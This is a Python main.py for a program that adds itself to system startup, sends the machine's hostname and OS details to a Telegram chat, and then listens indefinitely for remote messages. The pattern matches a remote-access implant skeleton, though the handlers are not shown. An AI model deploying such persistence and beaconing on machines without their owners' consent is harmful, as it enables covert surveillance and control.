# main.py

from single_instance import ensure_single_instance

# 🔒 Ensure only one instance runs
mutex = ensure_single_instance()

from telegram_client import TelegramClient
from logger import setup_logger
from startup import add_to_startup
from network import wait_for_internet
from datetime import datetime
import socket
import platform
import sys
import os
import time

logger = setup_logger()


def get_executable_path():
    if getattr(sys, "frozen", False):
        return sys.executable
    return os.path.abspath(__file__)


def get_system_info() -> str:
    hostname = socket.gethostname()
    os_name = platform.system()
    os_version = platform.version()
    boot_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    return (
        f"🖥 <b>System Started</b>\n"
        f"• Hostname: {hostname}\n"
        f"• OS: {os_name} {os_version}\n"
        f"• Time: {boot_time}"
    )


def main():
    logger.info("Application started")

    # Register startup once
    exe_path = get_executable_path()
    add_to_startup(exe_path)

    # Give system some breathing room
    time.sleep(15)

    # Wait for internet
    if not wait_for_internet(timeout=90):
        logger.error("Startup aborted: No internet")
        return

    client = TelegramClient()

    # Send startup message
    if not client.send_message(get_system_info(), retries=5, delay=6):
        logger.error("Startup message failed after retries")
    else:
        logger.info("Startup message delivered successfully")

    # Small cooldown
    time.sleep(10)

    # Enter persistent listener
    client.listen_forever()


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logger.critical(f"Fatal error: {e}", exc_info=True)
        sys.exit(1)
